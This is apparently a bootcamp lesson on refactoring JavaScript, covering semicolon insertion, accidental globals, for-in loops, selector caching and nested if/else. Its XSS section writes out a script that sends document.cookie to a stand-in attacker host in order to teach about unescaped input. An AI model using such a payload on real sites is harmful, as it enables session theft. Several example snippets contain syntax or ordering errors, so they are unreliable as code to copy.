---
title: Refactor Tractor: Game Time and Ideabox
length: 90
tags: javascript, refactoring, jquery
---
# Refactor Tractor: The JS Edition

## Learning Goals
* Understanding the general goal of refactoring
* Red, Green, Refactor Workflow
* Familiarity with common mistakes and avoiding bad practices in JavaScript code
* An overview of and practice with creating Github issues and submitting and reviewing Pull Requests

## Structure
* 25 - Warm Up and Discussion
* 5 - Break
* 15 - Low Hanging Fruit for Refactoring JavaScript Code
* 10 - More Complex Issues to Look Out For
* 5 - Break
* 25 - Your Turn

## Warmup and Discussion
__What Is Refactoring and Why Do It?__

"Refactoring is the process of changing a software system in such a way that it does not alter the external behavior of the code yet improves its internal structure."
-- Martin Fowler from [Refactoring: Improving The Design of Existing Code](http://www.amazon.com/Refactoring-Improving-Design-Existing-Code/dp/0201485672/ref=sr_1_1?ie=UTF8&qid=1452175241&sr=8-1&keywords=refactoring+improving)

- Makes code clearer and easier to work on

- Typically done in small steps

Refactoring is not exactly 'bug fixing', not exactly 'just rearranging code' and almost never 'adding features'.

![refactoring](http://i.imgur.com/oqKzbq1.jpg)

For that reason, even though this lesson is called 'Refactor Tractor' not everything in it is exactly refactoring. We will be covering learning to recognize common subtle bugs and code smells in JavaScript code. We will also be covering how to fix those bugs and communicating your fixes through Github.

__Discussion Points__
* What percentage of your time coding do you feel like you spend 'refactoring' what you've written?
* Books, articles or talks that help understanding writing cleaner code?
* What would the difference be between 'refactoring' and 'reworking'.

## Red, Green, Refactor
  'Red > Green > Refactor' is a short term used to explain the typical TDD work flow. The idea is that when you test driving software development you go through the following steps.

  Red: Think of something you want your code to do and write a test that will fail unless the code is functioning.

  Green: Write just enough code to make the test that you wrote earlier pass.

  Refactor: Now that the code works, you focus on cleaning it up. Eliminate duplication, improve the code quality.

  And repeat.

  If you've ever sat in front of a blank piece of paper trying to write a letter, report, poem, etc - you probably know that if you focus too hard of writing something beautiful and perfect on the first shot, the task is daunting and exhausting. However, if you allow yourself the freedom to write a second draft and go back and edit, you can feel freer to just get your thoughts out on the first pass.

  Refactoring is a lot like that, only instead of waiting for the very end to write another draft, you clean up after every paragraph or stanza.

  Regardless of whether or not a developer is working in a strictly 'Test Driven' way, red green refactor is an incredible useful thing to keep in mind.

  Many times when we are learning to program in general or just in a new language or style that we're unfamiliar with, we tend to make broad sweeping changes to the code we've written or get stuck worrying that we're not writing things correctly.

  Or we copy pasta a huge chunk of code from an example and try to make it work.

  Either way, the best way to not get overwhelmed is to follow the spirit of `red > green > refactor`.
  - Define what you want to code to do
  - Get the code to do what you want it to do in a measurable way (could be a test, could be manually testing) without fear of writing embarrassing code.
  - Clean up the code that is working

  In a less eloquent quote that the one provided by Martin Fowler, 'you can't polish a turd if you don't first have the turd'.

__Discussion Points__
* Exercism.io and Nitpicking
* What's an example of working in a `red > green > refactor` style without testing, per se.

## Low Hanging Refactoring Fruit

__aka The 'Oops I Left That In There' Code__

#### `debugger` statements
```js
  debugger;
```

I mean, first of all, that's a big security issue... second of all, that's just lazy, man.

#### Commented out code.
```js
  //#.bind(this);
```
 Sometimes an argument for commented out code can be made when it's there as a reminder or note to other developers. Sometimes. The above example is most likely unintentionally committed, however.

#### Wonky Whitespace
  Developers scan code - and mismatching or messed up whitespace is the equivalent of seeing someone with a misspelled tattoo. Doesn't matter how good the code is, it just looks odd.

#### Mismatched or Too Many Semicolons Used

```js
//...
success: function(idea){
  removeIdeaFromView(idea)
},
error: function(){
  console.log("fail");
}
```

JS does not enforce the use of semicolons, so it's possible to omit them. BUT when they are missing, the JavaScript parser automatically inserts them.

_This can change how your code behaves_

Check out this example from the [JavaScript Garden](http://bonsaiden.github.io/JavaScript-Garden/#core.semicolon)

```js
(function(window, undefined) {
    function test(options) {
        log('testing!')

        (options.list || []).forEach(function(i) {

        })

        options.value.test(
            'long string to pass here',
            'and another long string to pass'
        )

        return
        {
            foo: function() {}
        }
    }
    window.test = test

})(window)

(function(window) {
    window.someLibrary = {}

})(window)
```

This is how the interpreter will parse the code - which will change what the code does.

```js
(function(window, undefined) {
    function test(options) {

        // Not inserted, lines got merged
        log('testing!')(options.list || []).forEach(function(i) {

        }); // <- inserted

        options.value.test(
            'long string to pass here',
            'and another long string to pass'
        ); // <- inserted

        return; // <- inserted, breaks the return statement
        { // treated as a block

            // a label and a single expression statement
            foo: function() {}
        }; // <- inserted
    }
    window.test = test; // <- inserted

// The lines got merged again
})(window)(function(window) {
    window.someLibrary = {}; // <- inserted

})(window); //<- inserted
```

#### Accidental Global Variables

Forgetting a `var` can cause major problems in your code.

To review:

```js
var cat = 'fluffy';
// This defines a `cat` in the current scope

snake = 'snek';
// This defines a variable called `snake` in the global scope
```

This can cause some pretty gnarly bugs. [Try running the code below is jsbin](http://jsbin.com/fukuqupalo/edit?js,console).

```js
for(var i = 0; i < 5; i++) {
  console.log(i);
  methodThatAccidentlyCreatesAGlobalVariable();
  console.log(i);
}

function methodThatAccidentlyCreatesAGlobalVariable(){
  for(i = 0; i < 5; i++) { // welp, we forgot the var statement
    // ...
  }
}
```

The `methodThatAccidentlyCreatesAGlobalVariable()` creates a global `i` variable. The initial for loop will only run once.

__Discussion Points__
* What do you use to review code before you commit it?
* What do you use to catch these basic issues?

## More Complex JavaScript Code Issues to Look Out For

#### Uncached jQuery Selectors

```js
  $(“#myHeader”).hide();
  // do some things
  $("#myHeader").show();
```

In the above code, jQuery is searching the entire DOM tree to locate the `#myHeader` twice.

Instead, we should consider caching - storing the reference to the object in a variable.

```js
  var $myHeader = $(“#myHeader”);

  $myHeader.hide();
  // do some things
  $myHeader.show();
```

#### Array Iteration

`for in` loops should not be used to iterate over arrays.

Why?

1. The `for in` loop is twenty times slower than a normal `for` loop.
2. This is the big one: The `for in` loop enumerates all the properties that are on the prototype chain.

Imagine this scenario:

```js
Array.prototype.strangePet = 'snake';

var myPets = ['dog', 'dog', 'rock'];
for(var i in myPets){
  console.log(i); // 0, 1, 2, strangePet
  console.log(myPets[i]); // 'dog', 'dog', 'rock', 'snake'
  // You will see 'snake' show up in your list of pets
}
```

Does this ever happen in the real world?

One of my favorite bugs ever was in an old JavaScript project I worked on caused by a `for in` loop.

Early in the project's history, someone had added some code to the Array object to monkey patch in some Array methods not available in Internet Explorer. It would add a new method on the prototype but only if the user was accessing the site with an early IE.

Then, someone else decided to add some click tracking that would catch an array of data on certain clicks. It would iterate through an array - call any methods in the array and record any data.

Two years later, no one knew why one section of the website had never worked in Internet Explorer 8.

The reason? The click tracking code looked something like this:

```js
  for(var i in myArray){
    // if i is an method, call that method
    // else track the info
  }
```

Because they had added a monkey patch to Array, and because the `for in` loop iterates over all properties on a prototype chain... they were accessing the monkey patched method and calling it when they didn't mean to be calling the method and things blew up.

I spent way too long in an Internet Explorer emulator trying to figure out what was going on with that bug than I'd like to admit.

Avoid this fate by using classic `for` loops on arrays.

```js
for(var i = 0, i < myArray.length; i++) {
  //
}
```

You can see the correct way of array iteration being used [here](https://github.com/mcschatz/breakout/blob/cd05e17be5bf83b2b79554f880f8d98038dca41d/lib/game.js#L49)


#### Cross-Site Scripting (XSS) Attack Vulnerability
Cross-site Scripting is when malicious scripts are inserted into the client-side code of a web site or application. You are vulnerable to this kind of attack when you use unvalidated or unencoded user input directly in your site.

Let's say an attacker wants to steal your users cookies (I can't believe that's a real sentence in web development, but anyway... let's assume)

You could do something like that with this line of code:

```
<script>
  window.location='http://mysweethackingwebsite98736902/?cookie='+document.cookie
</script>
```

Now let's say that in your Blogger app, you take the contents of what someone types in a comment field - store it in the database - and then show it on a page.

Boom. Hacked.

Another example is - maybe you have a store online. Maybe you're selling very expensive t-shirts. Maybe you pull in information like price from the database.

Maybe you then run a sale that takes 10% off of the price and you do your calculation in JavaScript and then change the price on the page.

Maybe then, since you did the calculation in JavaScript, you rely on pulling in the t-shirt's price from the DOM when someone purchases it.

What could go wrong?

![yeezy](http://g.recordit.co/l1xVMiCft7.gif)

__Discussion Points__
* Did any of the above examples surprise you?
* How often do you think developers make these kinds of 'mistakes' in production code?
* How, other than memorizing flash cards, can you prevent potential bugs that you don't know are possible?

## Additional Code Smells

#### Breaking the Law of Demeter
The Law of Demeter (LoD) is a concept that is deeply rooted within the OOP community. From a high level it basically is a series of rules within object oriented programming. The premise behind it is if you create an object it should be agnostic to the other objects around it and it should be self sustaining. The methods on an object may only call methods of:
   1. The object itself.
   2. An argument of the method.
   3. Any object created within the method.
   4. Any direct properties/fields of the object.


#### Callback Hell

#### Single Responsibility Principle && Code that Does Too Much

#### Passing Many Arguments to a Function

#### Dead Code Among the Living

#### If If If Else If Else Else If Else ...

Deeply nested if/else statements should be avoided-- they make a program difficult to follow. There are many ways to refactor/restructure to avoid this condition, and good strategy can vary with the situation.

#### Breaking Up Functions

Instead of:

```js
if (input.indexOf("red" > -1)) {
  if (input.indexOf("boat" > -1)) {
    // Do the thing for red boats
  } else (input.indexOf("train" > -1)) {
    // Do the thing for red trains
  }
} else (input.indexOf("blue" > -1)) {
  // more if elses
}
```

You could:

```js
var deviceActions = {
  train : function(color) {
    // Do something for trains based on color
  },
  boat : function(color) {
    // Do something for boats based on color
  }
}

inputWords = input.split();
deviceActions[inputWords[0]](inputWords[1])
```

##### 2. Use an object (aka hash aka dictionary)

This was used somewhat in the previous example, but let's take a look at the classic fizzbuzz, or as exercism.io implements it, [raindrops](http://exercism.io/exercises/javascript/raindrops/readme). The gist of the problem is to output different words based on whether an integer is divisible by 3, 5, 7, or any combination thereof.

One method would be out-of-control if/elses something like:

```js
  if(n % 3 === 0) {
    if(n % 5 === 0) {
      if(n % 7 === 0) {
        return "plingplangplong";
      }
    } else if (n % 7 === 0) {
      return "plingplong";
    } else {
      return "pling"
    }
  } // much more code ...
```

Have you written a raindrops/fizzbuzz solution that looked like this? No judgement! Most people in the world do not have the patience, logical aptitude, or what have you, to sit down and make something like this work. So give yourself a nice back pat.

Another way to do this would be to see that we could just check once for each factor, appending to a result string:

```js
  var result = "";

  if(n % 3 === 0) {
    result += "pling";
  }
  if(n % 5 === 0) {
    result += "plang";
  }
  if(n % 7 === 0) {
    result += "plong";
  }
  return result;
```

Not looking too bad. Sometimes it's about taking a step back and thinking about what really needs to be done instead of getting right into the if/else weeds. Or, you can shamelessly write the if/elses to get the job done, then take a look at it and see if there are any patterns that could make the code cleaner.

For this example, the three isolated ifs with the trick of appending a single result might be a good stopping place. But sometimes it's more complex, which is where the hash pairs come in:

```js
  var result = "";
  var factors = Object.keys(factorMap);

  for(var i = 0; i < factors.length; i++) {
    var factor = parseInt(factors[i]);
    if (n % factor === 0) {
      result = result.concat(factorMap[factor]);
    }
  }

  var factorMap = {
    3 : "Pling",
    5 : "Plang",
    7 : "Plong"
  };
```
So now a dozen-ish if statements are down to one. Is this the best solution for this problem? Maybe not. But the hash method can be a useful refactoring tool.

##### 3. Recursion

Sometimes a hopelessly complex if/else branching sequence can be solved with some light recursion. Think about the [binary search tree](https://en.wikipedia.org/wiki/Binary_search_tree). To do an in-order traversal of a tree, you could use an algorithm like the one below. This is bad enough in pseudocode.. so let's leave javascript out of it for the moment:

```
start at the top of the tree
go left until you can't go left anymore, and carry around an index
  to keep track of how far down you are going
once at the bottom, put that value in your collection array
go right (up) one
is there a node to the right?
  yes: go there
    go left until you can't go left anymore
    ...
  no: add to collection
go right (up) one ...
...
```

It is complex and messy, but it will work. Eventually.

Or you could:

```js
function traverse(start) {
  start = start || root
  if(start === null){ return; }
  return traverse(start.left)
         .concat([start.data])
         .concat(traverse(start.right));
}
```
And that's it.

So, break your if/elses into functions/objects if you can, look for patterns and making the problem easier, and see if recursion can help as well.

## Your Turn

Some of the code examples from the above lesson came directly from Game Time and Ideabox projects.

Your mission now is to spend time in your projects doing some refactoring or researching and adding more code smells examples to this tutorial.

##### Find your Refactoring Buddy
  - You do NOT have to pair program with them if you prefer to work solo. That said, pairing is a good skill to have so it's worth trying. Come up with a plan, man. You will need to each submit a pull request that does one of the following things.

  1. Fix a 'code smell' in one of your Gametime or Ideabox projects
  2. Add a description of another JavaScript or general 'code smell' to look out for to this tutorial. You can claim one of the ones in the 'Additional Code Smells' block above or add one of your own.

#### You Must Follow the Workflow Below
- Dig into your IdeaBox and Game Time projects and try to identify issues or places for refactoring - OR - choose a code smell to add to this tutorial.
- Create a [Github Issue](https://help.github.com/articles/creating-an-issue/) for the fix or documentation addition if one doesn't exist already.
- Comment on any unclaimed issue to 'claim it' when you start work on a fix.
  - Why?: This is how you know that you're not duplicating work that someone else is doing on the project.
- Check out a branch and make the fix.
- You will need to submit Pull Requests for any refactors or documentation you make.
  - You can submit a Pull Requests for individual fixes or submit a PR that includes many fixes. There are pros and cons to either choice.
- [Use the following template as the body of your Pull Request(s)](https://gist.github.com/rrgayhart/c64f0966a36a9c47b227)
- On the PR:
  - Tag an instructor of your choice.
  - If: you worked with your Refactoring Buddy
    - Tag a member of another refactor team to review the PR
  - Else:
    - Tag your Refactoring Buddy to review the PR
- Review any PRs you have been tagged on.
  - Comment inline on the code or documentation changes. If you like something someone did, let them know. If you have concerns about the change, let them know (nicely). If you have questions, ask them. If you think the PR is good to merge, let them know with a thumbs up or a ship emoji or just regular old words.
  - Respond to the comments that you get on your PRs.

__A Note on Refactoring__

One of the best things about working as a programmer is working with other programmers. We all make mistakes in our code, from Linus Torvalds to [InfoSec Taylor Swift](https://twitter.com/SwiftOnSecurity?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor) to some guy named Fred who just finished a Code School course and added 'software developer' to his LinkedIn profile. It's impossible to know every trick and best practice, and even if you did, you'd still make silly code mistakes in the heat of the moment.

This is why we pair program and have code reviews.

The examples that we pull out in this tutorial are the kinds that every programmer makes. Sometimes it takes a second set of eyes to see where improvements can be made. You'll see them in your code, classmates' code, your instructors' code, your boss's code... etc.

Never be afraid to make a mistake, that's what you learn from!
